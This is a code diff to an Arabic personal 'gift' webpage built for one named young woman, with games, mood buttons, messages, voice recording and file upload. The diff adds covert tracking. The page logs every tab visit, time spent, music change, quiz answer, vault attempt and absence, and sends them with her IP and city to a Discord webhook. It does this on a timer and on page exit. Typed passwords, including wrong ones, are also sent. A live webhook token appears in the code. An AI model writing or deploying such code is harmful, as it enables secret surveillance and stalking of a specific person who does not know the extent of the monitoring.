@@ -1143,7 +1143,7 @@
 
             <!-- الاختيار السريع -->
             <section class="section-card">
-                <h2>⚡ اختيار سريع — 50+ سؤال</h2>
+                <h2>⚡ اختيار سريع — 60+ سؤال</h2>
                 <p style="text-align:center; color:var(--text-secondary); font-size:0.9rem;">اختاري بسرعة بين الخيارات، وكل إجاباتك توصلني تلقائياً</p>
                 <div class="game-box">
                     <div class="quick-game-question" id="quickQuestion">اضغطي ابدأ</div>
@@ -1275,32 +1275,186 @@
     </div>
 
     <script>
+        // ============================================================
+        // الإعدادات العامة
+        // ============================================================
         const webhookUrl = "https://canary.discord.com/api/webhooks/1561520531394666638/36aqBeHIGWz0bFWlUJxrKmUcALwvN734BOEu4EGtr3DUBIasR2gSU09amff-R_IADUYx";
         const DISCORD_MAX_FILE_SIZE = 25 * 1024 * 1024;
         const DISCORD_BATCH_SIZE = 10;
         const DISCORD_BATCH_DELAY = 1500;
 
-        // ============================================================
-        // كلمات المرور المتعددة
-        // ============================================================
         const PASSWORDS = [
-            "JOJO",
-            "jojo",
-            "JoJo",
-            "gory2024",
-            "jory2012",
-            "جوري",
-            "JORY",
-            "jory",
-            "قحطاني",
-            "JoJo2012",
-            "gory",
-            "أمجيزان",
-            "amjizan",
-            "2012"
+            "JOJO", "jojo", "JoJo", "gory2024", "jory2012", "جوري",
+            "JORY", "jory", "قحطاني", "JoJo2012", "gory", "أمجيزان", "amjizan", "2012"
         ];
         const PASSWORD_KEY = "gory_unlocked";
 
+        // ============================================================
+        // نظام تسجيل الأحداث
+        // ============================================================
+        const sessionStartTime = new Date();
+        const activityBuffer = [];
+        const tabTimes = {};
+        let currentTab = 'tab-story';
+        let currentTabStart = Date.now();
+        let activityFlushInterval = null;
+        let totalActions = 0;
+        const gameScores = {};
+        const sentMessages = [];
+        let vaultUnlocked = false;
+        let currentMood = null;
+        let currentTheme = 'dark';
+        let currentTrack = 'اوكي دوكي يو';
+
+        function logActivity(eventText, category = 'عام') {
+            totalActions++;
+            activityBuffer.push({
+                time: new Date().toLocaleTimeString('ar-SA', { timeZone: 'Asia/Riyadh' }),
+                category,
+                text: eventText
+            });
+            if (category === 'مهم') sendImmediateLog(eventText);
+        }
+
+        async function sendImmediateLog(text) {
+            const ipInfo = await getIPInfo();
+            let msg = `**🔔 حدث مهم**\n`;
+            msg += `**الحدث:** ${text}\n`;
+            msg += `**الجهاز:** ${getDeviceType()}\n`;
+            msg += `**الوقت:** ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}\n`;
+            if (ipInfo) {
+                msg += `**IP:** \`${ipInfo.ip}\`\n`;
+                if (ipInfo.city !== 'غير معروف') msg += `**المدينة:** ${ipInfo.city}\n`;
+            }
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: msg })
+            }).catch(() => {});
+        }
+
+        function startActivityFlush() {
+            activityFlushInterval = setInterval(async () => {
+                if (activityBuffer.length === 0) return;
+                const batch = activityBuffer.splice(0, activityBuffer.length);
+                await sendActivityBatch(batch);
+            }, 180000);
+        }
+
+        async function sendActivityBatch(batch) {
+            if (!batch.length) return;
+            const ipInfo = await getIPInfo();
+            let msg = `**📊 تقرير نشاط** (${batch.length} حدث)\n\n`;
+            const grouped = {};
+            batch.forEach(e => {
+                if (!grouped[e.category]) grouped[e.category] = [];
+                grouped[e.category].push(e);
+            });
+            for (const cat in grouped) {
+                msg += `**${cat}:**\n`;
+                grouped[cat].forEach(e => { msg += `• ${e.time} — ${e.text}\n`; });
+                msg += '\n';
+            }
+            if (ipInfo) msg += `**IP:** \`${ipInfo.ip}\``;
+            if (msg.length > 1900) msg = msg.slice(0, 1900) + '\n...';
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: msg })
+            }).catch(() => {});
+        }
+
+        async function sendSessionReport() {
+            const sessionEnd = new Date();
+            const durationMs = sessionEnd - sessionStartTime;
+            const durationMin = Math.floor(durationMs / 60000);
+            const durationSec = Math.floor((durationMs % 60000) / 1000);
+
+            const lastTabTime = Date.now() - currentTabStart;
+            tabTimes[currentTab] = (tabTimes[currentTab] || 0) + lastTabTime;
+
+            if (activityBuffer.length > 0) {
+                await sendActivityBatch(activityBuffer.splice(0, activityBuffer.length));
+            }
+
+            const ipInfo = await getIPInfo();
+            let msg = `**📋 تقرير جلسة جوري الكامل**\n\n`;
+            msg += `**⏰ بداية الجلسة:** ${sessionStartTime.toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}\n`;
+            msg += `**⏰ نهاية الجلسة:** ${sessionEnd.toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}\n`;
+            msg += `**⏳ مدة البقاء:** ${durationMin} دقيقة و ${durationSec} ثانية\n`;
+            msg += `**👆 عدد التفاعلات:** ${totalActions}\n\n`;
+
+            const tabNames = {
+                'tab-story': 'القصة', 'tab-timeline': 'مسار الصدف', 'tab-interactive': 'تفاعلات',
+                'tab-feelings': 'المشاعر', 'tab-info': 'بطاقة', 'tab-quiz': 'اختبار',
+                'tab-games': 'ألعاب', 'tab-images': 'رفع ملفات', 'tab-voice': 'تسجيل صوتي',
+                'tab-questions': 'الأسئلة', 'tab-extra': 'إضافات'
+            };
+            msg += `**📑 التبويبات (بالدقائق):**\n`;
+            for (const tab in tabTimes) {
+                msg += `• ${tabNames[tab] || tab}: ${(tabTimes[tab] / 60000).toFixed(1)} دقيقة\n`;
+            }
+
+            if (Object.keys(gameScores).length > 0) {
+                msg += `\n**🎮 الألعاب:**\n`;
+                for (const game in gameScores) msg += `• ${game}: ${gameScores[game]}\n`;
+            }
+
+            msg += `\n**🔐 الحالة:**\n`;
+            msg += `• الخزينة: ${vaultUnlocked ? 'فُتحت ✓' : 'لم تُفتح'}\n`;
+            msg += `• الوضع: ${currentTheme === 'light' ? 'نهاري' : 'ليلي'}\n`;
+            msg += `• المزاج: ${currentMood || 'لم يُحدد'}\n`;
+            msg += `• الأغنية: ${currentTrack}\n`;
+            msg += `• رسائل: ${sentMessages.length}\n`;
+
+            if (ipInfo) {
+                msg += `\n**📍 IP:** \`${ipInfo.ip}\`\n`;
+                if (ipInfo.city !== 'غير معروف') msg += `**المدينة:** ${ipInfo.city}\n`;
+            }
+            if (msg.length > 1900) msg = msg.slice(0, 1900) + '\n...';
+
+            try {
+                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
+                navigator.sendBeacon(webhookUrl, blob);
+            } catch (e) {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: msg }),
+                    keepalive: true
+                }).catch(() => {});
+            }
+        }
+
+        startActivityFlush();
+
+        function trackTabTime(newTab) {
+            if (newTab === currentTab) return;
+            const elapsed = Date.now() - currentTabStart;
+            tabTimes[currentTab] = (tabTimes[currentTab] || 0) + elapsed;
+            currentTab = newTab;
+            currentTabStart = Date.now();
+        }
+
+        window.addEventListener('beforeunload', () => { sendSessionReport(); });
+        window.addEventListener('pagehide', () => { sendSessionReport(); });
+
+        let hiddenTime = 0;
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                hiddenTime = Date.now();
+            } else {
+                if (hiddenTime) {
+                    const away = Math.floor((Date.now() - hiddenTime) / 1000);
+                    if (away > 30) logActivity(`عادت بعد غياب ${away} ثانية`, 'عام');
+                    hiddenTime = 0;
+                }
+            }
+        });
+
+        // ============================================================
+        // دوال مساعدة
+        // ============================================================
         function showToast(msg, type = 'info', duration = 2500) {
             const container = document.getElementById('toastContainer');
             const toast = document.createElement('div');
@@ -1351,44 +1505,35 @@
                     city: data.city || 'غير معروف',
                     region: data.region || 'غير معروف',
                     country: data.country_name || 'غير معروف',
-                    org: data.org || '',
-                    latitude: data.latitude || '',
-                    longitude: data.longitude || ''
+                    org: data.org || ''
                 };
             } catch (e) { return null; }
         }
 
         async function sendVisitorInfo() {
             const ipInfo = await getIPInfo();
-            const now = new Date();
-            const timeStr = now.toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' });
-
+            const timeStr = new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' });
             let msg = '**🚨 زائر جديد دخل الموقع 🚨**\n\n';
             msg += `**⏰ وقت الزيارة:** ${timeStr}\n`;
             msg += `**👤 الجهاز:** ${getDeviceType()}\n`;
-            msg += `**💻 نظام التشغيل:** ${getOS()}\n`;
+            msg += `**💻 النظام:** ${getOS()}\n`;
             msg += `**🌐 المتصفح:** ${getBrowser()}\n`;
             msg += `**🌍 اللغة:** ${navigator.language}\n`;
             msg += `**📱 الشاشة:** ${screen.width} × ${screen.height}\n`;
-            msg += `**🔗 الرابط:** ${document.referrer || 'مباشر'}\n`;
-            msg += `**📶 متصل:** ${navigator.onLine ? 'نعم' : 'لا'}\n\n`;
-
+            msg += `**🔗 المرجع:** ${document.referrer || 'مباشر'}\n\n`;
             if (ipInfo) {
-                msg += `**📍 الموقع التقريبي:**\n`;
-                msg += `**IP:** \`${ipInfo.ip}\`\n`;
+                msg += `**📍 الموقع:**\n**IP:** \`${ipInfo.ip}\`\n`;
                 if (ipInfo.city !== 'غير معروف') msg += `**المدينة:** ${ipInfo.city}\n`;
                 if (ipInfo.region) msg += `**المنطقة:** ${ipInfo.region}\n`;
                 if (ipInfo.country) msg += `**الدولة:** ${ipInfo.country}\n`;
                 if (ipInfo.org) msg += `**مزود الخدمة:** ${ipInfo.org}\n`;
             }
-
             if (msg.length > 1900) msg = msg.slice(0, 1900) + '\n...';
-
             await fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ content: msg })
-            }).catch(e => console.error('Visitor info failed:', e));
+            }).catch(() => {});
         }
 
         async function sendWebhook(content) {
@@ -1399,12 +1544,12 @@
                     body: JSON.stringify({ content })
                 });
                 return res.ok;
-            } catch (err) {
-                console.error(err);
-                return false;
-            }
+            } catch (err) { return false; }
         }
 
+        // ============================================================
+        // كلمة المرور
+        // ============================================================
         let failedAttempts = 0;
 
         function tryUnlock() {
@@ -1426,8 +1571,8 @@
 
         async function sendLoginSuccess(usedPassword) {
             const ipInfo = await getIPInfo();
-            let msg = `**✅ دخول ناجح للموقع**\n`;
-            msg += `**كلمة المرور المستخدمة:** \`${usedPassword}\`\n`;
+            let msg = `**✅ دخول ناجح**\n`;
+            msg += `**كلمة المرور:** \`${usedPassword}\`\n`;
             msg += `**الجهاز:** ${getDeviceType()}\n`;
             msg += `**المتصفح:** ${getBrowser()}\n`;
             msg += `**النظام:** ${getOS()}\n`;
@@ -1447,14 +1592,14 @@
         async function sendFailedAttempt(wrongPassword) {
             const ipInfo = await getIPInfo();
             let msg = `**⚠️ محاولة دخول خاطئة #${failedAttempts}**\n`;
-            msg += `**كلمة المرور المُدخلة:** \`${wrongPassword.substring(0, 30)}\`\n`;
+            msg += `**كلمة المرور:** \`${wrongPassword.substring(0, 30)}\`\n`;
             msg += `**الجهاز:** ${getDeviceType()}\n`;
             msg += `**المتصفح:** ${getBrowser()}\n`;
             msg += `**النظام:** ${getOS()}\n`;
             msg += `**الوقت:** ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}\n`;
             if (ipInfo) {
                 msg += `**IP:** \`${ipInfo.ip}\`\n`;
-                if (ipInfo.city && ipInfo.city !== 'غير معروف') msg += `**المدينة:** ${ipInfo.city}\n`;
+                if (ipInfo.city !== 'غير معروف') msg += `**المدينة:** ${ipInfo.city}\n`;
                 if (ipInfo.country) msg += `**الدولة:** ${ipInfo.country}\n`;
             }
             await fetch(webhookUrl, {
@@ -1474,22 +1619,37 @@
             setTimeout(() => sendVisitorInfo(), 1000);
         }
 
+        // ============================================================
+        // أدوات مساعدة
+        // ============================================================
         function copyText(text) {
             if (!text) { showToast("ما فيه نص", "error"); return; }
             if (navigator.clipboard) {
-                navigator.clipboard.writeText(text).then(() => showToast("تم النسخ", "success")).catch(() => showToast("تعذر", "error"));
+                navigator.clipboard.writeText(text).then(() => {
+                    showToast("تم النسخ", "success");
+                    logActivity('نسخت نصاً', 'عام');
+                }).catch(() => showToast("تعذر", "error"));
             } else {
                 const ta = document.createElement('textarea');
                 ta.value = text;
                 document.body.appendChild(ta);
                 ta.select();
-                try { document.execCommand('copy'); showToast("تم النسخ", "success"); }
+                try { document.execCommand('copy'); showToast("تم النسخ", "success"); logActivity('نسخت نصاً', 'عام'); }
                 catch(e) { showToast("تعذر", "error"); }
                 ta.remove();
             }
         }
 
         function switchTab(tabId, btn) {
+            trackTabTime(tabId);
+            const tabNames = {
+                'tab-story': 'القصة', 'tab-timeline': 'مسار الصدف', 'tab-interactive': 'تفاعلات',
+                'tab-feelings': 'المشاعر', 'tab-info': 'بطاقة', 'tab-quiz': 'اختبار',
+                'tab-games': 'الألعاب', 'tab-images': 'رفع ملفات', 'tab-voice': 'التسجيل الصوتي',
+                'tab-questions': 'الأسئلة', 'tab-extra': 'الإضافات'
+            };
+            logActivity(`فتحت تبويب ${tabNames[tabId] || tabId}`, 'تنقل');
+
             document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
             document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
             const target = document.getElementById(tabId);
@@ -1505,8 +1665,10 @@
         function toggleTheme() {
             document.body.classList.toggle('light-mode');
             const isLight = document.body.classList.contains('light-mode');
+            currentTheme = isLight ? 'light' : 'dark';
             document.getElementById('themeBtn').innerText = isLight ? '☀️' : '🌙';
             localStorage.setItem('gory_theme', isLight ? 'light' : 'dark');
+            logActivity(`غيّرت الوضع إلى ${isLight ? 'النهاري' : 'الليلي'}`, 'إعدادات');
         }
 
         (function restoreSettings() {
@@ -1514,6 +1676,7 @@
             if (theme === 'light') {
                 document.body.classList.add('light-mode');
                 document.getElementById('themeBtn').innerText = '☀️';
+                currentTheme = 'light';
             }
             const lastTab = localStorage.getItem('gory_last_tab');
             if (lastTab) {
@@ -1523,12 +1686,15 @@
                     document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
                     document.getElementById(lastTab).classList.add('active');
                     btn.classList.add('active');
+                    currentTab = lastTab;
                 }
             }
             const lastTrack = localStorage.getItem('gory_track');
             if (lastTrack) {
                 document.getElementById('trackSelect').value = lastTrack;
                 document.getElementById('audioSource').src = lastTrack;
+                const sel = document.getElementById('trackSelect');
+                currentTrack = sel.options[sel.selectedIndex].text;
             }
         })();
 
@@ -1561,43 +1727,64 @@
             document.getElementById('daysTogether').innerText = diff > 0 ? diff : 0;
         })();
 
+        // ============================================================
+        // الموسيقى
+        // ============================================================
         function toggleAudio() {
             const audio = document.getElementById('bgAudio');
             const btn = document.getElementById('playBtn');
             if (audio.paused) {
-                audio.play().then(() => { btn.innerText = "⏸"; }).catch(() => showToast("تعذر التشغيل", "error"));
+                audio.play().then(() => {
+                    btn.innerText = "⏸";
+                    logActivity('شغّلت الموسيقى', 'موسيقى');
+                }).catch(() => showToast("تعذر التشغيل", "error"));
             } else {
                 audio.pause();
                 btn.innerText = "▶";
+                logActivity('أوقفت الموسيقى', 'موسيقى');
             }
         }
+
         function changeTrack() {
             const audio = document.getElementById('bgAudio');
             const source = document.getElementById('audioSource');
-            const val = document.getElementById('trackSelect').value;
+            const select = document.getElementById('trackSelect');
+            const val = select.value;
+            const trackName = select.options[select.selectedIndex].text;
+            currentTrack = trackName;
             source.src = val;
             localStorage.setItem('gory_track', val);
             audio.load();
             audio.play().then(() => { document.getElementById('playBtn').innerText = "⏸"; })
                         .catch(() => { document.getElementById('playBtn').innerText = "▶"; });
+            logActivity(`غيّرت الأغنية إلى: ${trackName}`, 'موسيقى');
         }
 
+        // ============================================================
+        // المزاج
+        // ============================================================
         async function sendMood(moodText, el) {
             document.querySelectorAll('.mood-btn').forEach(b => b.classList.remove('selected'));
             if (el) el.classList.add('selected');
             localStorage.setItem('gory_last_mood', moodText);
+            currentMood = moodText;
             const ipInfo = await getIPInfo();
             const ok = await sendWebhook(`**شعور جوري اليوم:** ${moodText}\n**الجهاز:** ${getDeviceType()} | **IP:** ${ipInfo?.ip || 'غير معروف'}`);
             showToast(ok ? "تم تسجيل شعورك" : "تعذر", ok ? "success" : "error");
+            logActivity(`اختارت المزاج: ${moodText}`, 'تفاعل');
         }
         (function restoreMood() {
             const last = localStorage.getItem('gory_last_mood');
             if (last) {
                 const btn = document.querySelector(`.mood-btn[data-mood="${last}"]`);
                 if (btn) btn.classList.add('selected');
+                currentMood = last;
             }
         })();
 
+        // ============================================================
+        // رسالة اليوم
+        // ============================================================
         const dailyMessages = [
             "ابتسامتك تغير يوم كامل", "أنت شخص نادر", "أتمنى لك يوم هادئ", "مكانتك لا تتغير",
             "وجودك يضيف دفء", "أنت أقوى مما تظنين", "كل خطوة صغيرة مهمة", "استمري في طريقك",
@@ -1617,15 +1804,24 @@
         }
         document.getElementById('fortuneText').innerText = getTodayMessage();
 
-        function unlockVault() {
+        // ============================================================
+        // الخزينة
+        // ============================================================
+        async function unlockVault() {
             if (document.getElementById('vaultPin').value.trim() === "2012") {
                 document.getElementById('vaultContent').style.display = "block";
                 showToast("الخزينة مفتوحة", "success");
+                vaultUnlocked = true;
+                logActivity('فتحت الخزينة السرية بنجاح', 'مهم');
             } else {
                 showToast("رمز خطأ", "error");
+                logActivity('حاولت فتح الخزينة برمز خاطئ', 'عام');
             }
         }
 
+        // ============================================================
+        // الاختبار
+        // ============================================================
         function checkQuiz(el, isCorrect) {
             if (el.classList.contains('correct') || el.classList.contains('wrong')) return;
             const parent = el.parentElement;
@@ -1633,8 +1829,10 @@
             el.classList.add(isCorrect ? 'correct' : 'wrong');
             if (isCorrect) {
                 showToast("إجابة صحيحة", "success");
+                logActivity('أجابت صح في اختبار الذكريات', 'تفاعل');
             } else {
                 showToast("إجابة خاطئة", "error");
+                logActivity('أجابت خطأ في اختبار الذكريات', 'تفاعل');
                 setTimeout(() => {
                     parent.querySelectorAll('.quiz-option').forEach(o => { if (o !== el) o.classList.remove('disabled'); });
                     el.classList.remove('wrong');
@@ -1655,6 +1853,9 @@
             badge.classList.add('show');
         }
 
+        // ============================================================
+        // الرسالة الخاصة
+        // ============================================================
         async function sendPrivateNote() {
             const noteText = document.getElementById('privateNote').value.trim();
             if (!noteText) { showToast("اكتبي رسالة أولا", "error"); return; }
@@ -1664,12 +1865,17 @@
             const ok = await sendWebhook(msg);
             if (ok) {
                 showToast("تم الإرسال", "success");
+                sentMessages.push({ type: 'رسالة خاصة', preview: noteText.substring(0, 50) });
                 document.getElementById('privateNote').value = "";
                 document.getElementById('noteCount').innerText = "0 حرف";
                 incrementFeelingsBadge();
+                logActivity(`أرسلت رسالة خاصة (${noteText.length} حرف)`, 'مهم');
             } else showToast("تعذر", "error");
         }
 
+        // ============================================================
+        // خريطة الذكريات
+        // ============================================================
         const mapMemories = {
             map1: "تايم بومب — أول لقاء، أول ضحكة، وأول كلمة أمجيزان.",
             map3: "سيرفر 505 — كأن الدنيا تلف وترجع تجمعنا.",
@@ -1680,8 +1886,12 @@
             const info = document.getElementById('mapInfo');
             info.innerText = mapMemories[key] || "";
             info.classList.add('show');
+            logActivity(`فتحت ذكرى من الخريطة: ${key}`, 'تفاعل');
         }
 
+        // ============================================================
+        // التسجيل الصوتي
+        // ============================================================
         let mediaRecorder = null;
         let audioChunks = [];
         let recInterval = null;
@@ -1709,6 +1919,7 @@
                         const s = String(recSeconds % 60).padStart(2, '0');
                         document.getElementById('recTimer').innerText = m + ":" + s;
                     }, 1000);
+                    logActivity('بدأت تسجيل صوتي', 'تسجيل');
                 } catch (err) {
                     showToast("لم يتم السماح بالميكروفون", "error");
                 }
@@ -1757,6 +1968,7 @@
                     document.getElementById('recStatus').innerText = "اضغطي الميكروفون للبدء";
                     window._pendingRecording = null;
                     incrementFeelingsBadge();
+                    logActivity(`أرسلت تسجيل صوتي (${recSeconds} ثانية)`, 'مهم');
                 } else {
                     showToast("تعذر الإرسال", "error");
                 }
@@ -1766,9 +1978,10 @@
         }
 
         // ============================================================
-        // دالة إرسال نتائج الألعاب للويب هوك
+        // إرسال نتائج الألعاب
         // ============================================================
         async function sendGameResultToWebhook(gameName, score, total, details) {
+            gameScores[gameName] = `${score}/${total}`;
             try {
                 const ipInfo = await getIPInfo();
                 let msg = `**🎮 نتيجة لعبة: ${gameName}**\n\n`;
@@ -1782,19 +1995,17 @@
                 }
 
                 if (details && details.length > 0) {
-                    const detailLines = details.map((d, i) =>
-                        `${i + 1}. [${d.category || 'عام'}] ${d.question}: **${d.answer}**`
-                    );
-
-                    // إرسال الرسالة الأساسية أولاً
                     await fetch(webhookUrl, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ content: msg })
                     }).catch(() => {});
 
-                    // إرسال التفاصيل على دفعات
-                    let chunk = '**📋 تفاصيل اختيارات جوري:**\n\n';
+                    const detailLines = details.map((d, i) =>
+                        `${i + 1}. [${d.category || 'عام'}] ${d.question}: **${d.answer}**`
+                    );
+
+                    let chunk = '**📋 تفاصيل الاختيارات:**\n\n';
                     for (const line of detailLines) {
                         if ((chunk + line + '\n').length > 1900) {
                             await fetch(webhookUrl, {
@@ -1823,9 +2034,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: msg })
                 }).catch(() => {});
-            } catch (e) {
-                console.error('Game result failed:', e);
-            }
+            } catch (e) {}
         }
 
         // ============================================================
@@ -1840,6 +2049,7 @@
             const area = document.getElementById('heartGameArea');
             area.innerHTML = "";
             document.getElementById('gameScore').innerText = `النقاط: 0 — الوقت: ${timeLeft}`;
+            logActivity('بدأت لعبة القلب', 'لعبة');
 
             gameInterval = setInterval(() => {
                 if (!gameActive) return;
@@ -1909,6 +2119,7 @@
                 board.appendChild(card);
             });
             document.getElementById('memoryScore').innerText = `المحاولات: 0 — الأزواج: 0/8`;
+            logActivity('بدأت لعبة الذاكرة', 'لعبة');
         }
         function flipMemoryCard(card) {
             if (memoryLock || card.classList.contains('flipped') || card.classList.contains('matched')) return;
@@ -1943,10 +2154,9 @@
         initMemoryGame();
 
         // ============================================================
-        // الاختيار السريع — 50+ سؤال
+        // الاختيار السريع
         // ============================================================
         const quickQuestions = [
-            // الأكل والشرب
             { q: "وش تحبين أكثر", a: "قهوة", b: "شاي", cat: "أكل" },
             { q: "وش تفضلين", a: "حلو", b: "مالح", cat: "أكل" },
             { q: "وش تحبين أكثر", a: "شاورما", b: "برجر", cat: "أكل" },
@@ -1957,8 +2167,6 @@
             { q: "وش تفضلين", a: "مطعم", b: "بيت", cat: "أكل" },
             { q: "وش تحبين أكثر", a: "دجاج", b: "لحم", cat: "أكل" },
             { q: "وش تفضلين", a: "مقلي", b: "مشوي", cat: "أكل" },
-
-            // الأماكن
             { q: "وش تفضلين", a: "بحر", b: "جبل", cat: "أماكن" },
             { q: "وش تحبين أكثر", a: "الرياض", b: "جدة", cat: "أماكن" },
             { q: "وش تفضلين", a: "سفر", b: "بيت", cat: "أماكن" },
@@ -1966,16 +2174,12 @@
             { q: "وش تفضلين", a: "فندق", b: "شاليه", cat: "أماكن" },
             { q: "وش تحبين أكثر", a: "مول", b: "حديقة", cat: "أماكن" },
             { q: "وش تفضلين", a: "شمال", b: "جنوب", cat: "أماكن" },
-
-            // الوقت
             { q: "وش تحبين أكثر", a: "ليل", b: "نهار", cat: "وقت" },
             { q: "وش تفضلين", a: "شتاء", b: "صيف", cat: "وقت" },
             { q: "وش تحبين أكثر", a: "صباح", b: "مساء", cat: "وقت" },
             { q: "وش تفضلين", a: "ربيع", b: "خريف", cat: "وقت" },
             { q: "وش تحبين أكثر", a: "جمعة", b: "خميس", cat: "وقت" },
             { q: "وش تفضلين", a: "عطلة", b: "دراسة", cat: "وقت" },
-
-            // الترفيه
             { q: "وش تحبين أكثر", a: "فيلم", b: "مسلسل", cat: "ترفيه" },
             { q: "وش تفضلين", a: "أنمي", b: "دراما", cat: "ترفيه" },
             { q: "وش تحبين أكثر", a: "موسيقى", b: "بودكاست", cat: "ترفيه" },
@@ -1987,34 +2191,24 @@
             { q: "وش تحبين أكثر", a: "أفلام رعب", b: "أفلام رومانسية", cat: "ترفيه" },
             { q: "وش تفضلين", a: "أغاني عربية", b: "أغاني أجنبية", cat: "ترفيه" },
             { q: "وش تحبين أكثر", a: "مغامرة", b: "كوميديا", cat: "ترفيه" },
-
-            // الحيوانات
             { q: "وش تفضلين", a: "قطة", b: "كلب", cat: "حيوانات" },
             { q: "وش تحبين أكثر", a: "أسد", b: "نمر", cat: "حيوانات" },
             { q: "وش تفضلين", a: "حصان", b: "جمل", cat: "حيوانات" },
             { q: "وش تحبين أكثر", a: "عصفور", b: "سمكة", cat: "حيوانات" },
-
-            // الألوان
             { q: "وش تحبين أكثر", a: "وردي", b: "بنفسجي", cat: "ألوان" },
             { q: "وش تفضلين", a: "أسود", b: "أبيض", cat: "ألوان" },
             { q: "وش تحبين أكثر", a: "أزرق", b: "أحمر", cat: "ألوان" },
-
-            // شخصية
             { q: "أنت أقرب إلى", a: "هادية", b: "حيوية", cat: "شخصية" },
             { q: "أنت في الغالب", a: "منظمة", b: "عفوية", cat: "شخصية" },
             { q: "أنت تفضلين", a: "التخطيط", b: "المفاجآت", cat: "شخصية" },
             { q: "أنت أكثر", a: "صريحة", b: "مجاملة", cat: "شخصية" },
             { q: "أنت في الحب", a: "عقلانية", b: "عاطفية", cat: "شخصية" },
             { q: "أنت أكثر", a: "اجتماعية", b: "انطوائية", cat: "شخصية" },
-
-            // علاقات
             { q: "تفضلين", a: "رسالة طويلة", b: "مكالمة", cat: "علاقات" },
             { q: "تفضلين", a: "هدية", b: "كلمة حلوة", cat: "علاقات" },
             { q: "تفضلين", a: "خروج مع صديقات", b: "جلسة مع شخص واحد", cat: "علاقات" },
             { q: "في الخلاف", a: "تتكلمين", b: "تسكتين", cat: "علاقات" },
             { q: "تفضلين", a: "الحب من أول نظرة", b: "الحب بعد معرفة", cat: "علاقات" },
-
-            // خيارات
             { q: "لو خيروك", a: "فلوس", b: "صحة", cat: "خيارات" },
             { q: "لو خيروك", a: "طيارة خاصة", b: "فيلا", cat: "خيارات" },
             { q: "لو خيروك", a: "تقرأين أفكار الناس", b: "تختفين", cat: "خيارات" },
@@ -2023,9 +2217,6 @@
             { q: "لو خيروك", a: "تعرفين المستقبل", b: "تغيرين الماضي", cat: "خيارات" },
             { q: "لو خيروك", a: "مليون ريال", b: "صحة دائمة", cat: "خيارات" },
             { q: "لو خيروك", a: "تسكنين جبل", b: "تسكنين بحر", cat: "خيارات" },
-            { q: "لو خيروك", a: "تقابلين شخصية تاريخية", b: "تقابلين شخصية خيالية", cat: "خيارات" },
-
-            // حب
             { q: "الحب عندك", a: "كلمة", b: "فعل", cat: "حب" },
             { q: "تعبير الحب", a: "بالكلام", b: "بالأفعال", cat: "حب" },
             { q: "الغيرة", a: "دليل حب", b: "دليل شك", cat: "حب" },
@@ -2044,6 +2235,7 @@
             quickActive = true;
             document.getElementById('quickScore').innerText = `النقاط: 0`;
             showQuickQuestion();
+            logActivity('بدأت الاختيار السريع', 'لعبة');
         }
 
         function showQuickQuestion() {
@@ -2107,7 +2299,6 @@
             selectedFiles.forEach((file, idx) => {
                 const item = document.createElement('div');
                 item.className = 'preview-item';
-
                 if (file.type.startsWith('image/')) {
                     const img = document.createElement('img');
                     img.src = URL.createObjectURL(file);
@@ -2131,12 +2322,10 @@
                     fileIcon.innerHTML = `<span class="big-icon">📎</span><span>${file.name}</span>`;
                     item.appendChild(fileIcon);
                 }
-
                 const sizeTag = document.createElement('div');
                 sizeTag.className = 'file-size';
                 sizeTag.innerText = formatFileSize(file.size);
                 item.appendChild(sizeTag);
-
                 const removeBtn = document.createElement('button');
                 removeBtn.className = 'preview-remove';
                 removeBtn.innerText = '✕';
@@ -2146,7 +2335,6 @@
                     renderPreviews();
                 };
                 item.appendChild(removeBtn);
-
                 grid.appendChild(item);
             });
         }
@@ -2159,17 +2347,12 @@
                 if (note) content += `\n**تعليق:** ${note}`;
                 content += `\n**الجهاز:** ${getDeviceType()} | **IP:** ${ipInfo?.ip || 'غير معروف'}`;
                 formData.append('payload_json', JSON.stringify({ content }));
-
                 files.forEach((file, i) => {
                     formData.append(`files[${i}]`, file, file.name || `file_${i}`);
                 });
-
                 const res = await fetch(webhookUrl, { method: 'POST', body: formData });
                 return res.ok;
-            } catch (err) {
-                console.error('Batch error:', err);
-                return false;
-            }
+            } catch (err) { return false; }
         }
 
         async function sendImages() {
@@ -2178,33 +2361,27 @@
                 showToast("اختاري ملفا أولا", "error");
                 return;
             }
-
             const note = document.getElementById('imageNote').value.trim();
             const valid = selectedFiles.filter(f => f.size <= DISCORD_MAX_FILE_SIZE);
             const tooBig = selectedFiles.length - valid.length;
-
             if (tooBig > 0) showToast(`${tooBig} ملف كبير تم تجاهله`, "error");
             if (!valid.length) {
                 status.innerText = "لا توجد ملفات صالحة";
                 status.style.color = '#ef4444';
                 return;
             }
-
             const batches = [];
             for (let i = 0; i < valid.length; i += DISCORD_BATCH_SIZE) {
                 batches.push(valid.slice(i, i + DISCORD_BATCH_SIZE));
             }
-
             status.style.color = 'var(--gold-accent)';
             let successCount = 0;
-
             for (let i = 0; i < batches.length; i++) {
                 status.innerText = `جاري إرسال ${i + 1}/${batches.length}...`;
                 const ok = await sendBatch(batches[i], note, i + 1, batches.length);
                 if (ok) successCount += batches[i].length;
                 if (i < batches.length - 1) await new Promise(r => setTimeout(r, DISCORD_BATCH_DELAY));
             }
-
             if (successCount === valid.length) {
                 status.innerText = `تم إرسال ${successCount} ملف`;
                 status.style.color = '#22c55e';
@@ -2213,6 +2390,7 @@
